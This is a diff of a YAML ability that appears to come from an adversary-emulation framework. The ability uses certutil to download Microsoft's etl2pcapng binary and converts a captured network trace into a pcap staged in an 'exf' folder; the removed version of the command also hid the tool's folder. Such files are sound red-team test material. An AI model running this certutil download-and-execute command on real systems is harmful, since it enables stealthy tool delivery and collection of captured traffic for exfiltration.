@@ -1,43 +1,43 @@
-- privilege: ''
-  plugin: ''
-  delete_payload: true
-  technique_id: T1059.001
-  additional_info:
+- additional_info:
     cleanup: '[]'
-  technique_name: 'Command and Scripting Interpreter: PowerShell'
-  repeatable: false
   tactic: execution
+  name: Download extract etl2pcapng to convert packet capture with certutil
   requirements: []
-  description: Downloads with certutil latest package of etl2pcapng, uncompress the
-    archive  and convert etl capture to PCAPNG file
+  buckets: []
+  technique_id: T1059.001
+  privilege: ''
+  singleton: false
+  plugin: ''
   executors:
-  - platform: windows
-    cleanup:
-    - Remove-Item -Path $env:PUBLIC\Toolz\etl2pcapng.zip -Confirm
+  - additional_info: {}
     variations: []
-    timeout: 60
-    additional_info: {}
     name: psh
     payloads: []
+    cleanup:
+    - Remove-Item -Path $env:PUBLIC\Toolz\etl2pcapng.exe
     language: null
-    uploads: []
-    parsers: []
-    code: null
-    build_target: null
     command: "$etl_capture_file = \"$env:PUBLIC\\exf\\capture.etl\";\n$pcap_file =\
       \ \"$env:PUBLIC\\exf\\capture.pcap\";\n$etl2pcapng_command = \"$env:PUBLIC\\\
-      etl2pcapng\\x86\\etl2pcapng.exe\";\n$exf_file = \"$env:PUBLIC\\exf\\capture.log\"\
-      ;\n\nif ([System.IO.File]::Exists(\"$etl_capture_file\")) {\ncertutil -urlcache\
-      \ -f https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\
-      \ \"$env:PUBLIC\\Toolz\\etl2pcapng.zip\";\nAdd-Type -Assembly 'System.IO.Compression.FileSystem';\
-      \ \n[System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:PUBLIC\\Toolz\\etl2pcapng.zip\"\
-      ,\"$env:PUBLIC\");\n$psdir=Get-Item \"$env:PUBLIC\\Toolz\\etl2pcapng\" -Force;\n$psdir.attributes=\"\
-      hidden\";\n$convert=\"$etl2pcapng_command\"+\" \"+\"$etl_capture_file\"+\" \"\
-      +\"$pcap_file\";\nInvoke-Expression $convert;\nexit 0;\n} \nelse {\n Write-Host\
-      \ \"The file [\"$etl_capture_file\"] does not exists !!!\" >$exf_file;\n  exit\
-      \ 1;\n};"
-  singleton: false
-  buckets: []
-  name: Download extract etl2pcapng to convert packet capture with certutil
+      Toolz\\etl2pcapng.exe\";\n$exf_file = \"$env:PUBLIC\\exf\\capture.log\";\n\n\
+      if ([System.IO.File]::Exists(\"$etl_capture_file\")) {\ncertutil -urlcache -f\
+      \ https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.exe\
+      \ \"$env:PUBLIC\\Toolz\\etl2pcapng.exe\";\nif ([System.IO.File]::Exists(\"$env:PUBLIC\\\
+      Toolz\\etl2pcapng.exe\")) { \n$convert = \"$etl2pcapng_command\"+\" $etl_capture_file\"\
+      +\" $pcap_file\";\nInvoke-Expression $convert | Out-File -FilePath \"$exf_file\"\
+      ; ;\nAdd-Content -Path $exf_file \"The file $etl_capture_file has been converted\
+      \ to $pcap_file. You can now read it with Wireshark\";\nexit 0;\n}; \nelse {\n\
+      \  \"The The file $etl_capture_file does not exists !!!\" | Out-File -FilePath\
+      \ \"$exf_file\";\n  exit 1;\n};\n}"
+    timeout: 60
+    uploads: []
+    build_target: null
+    code: null
+    platform: windows
+    parsers: []
+  description: Downloads with certutil latest package of etl2pcapng, uncompress the
+    archive  and convert etl capture to PCAPNG file
+  repeatable: false
   access: {}
+  delete_payload: true
+  technique_name: 'Command and Scripting Interpreter: PowerShell'
   id: etl2pcap_download_and_use
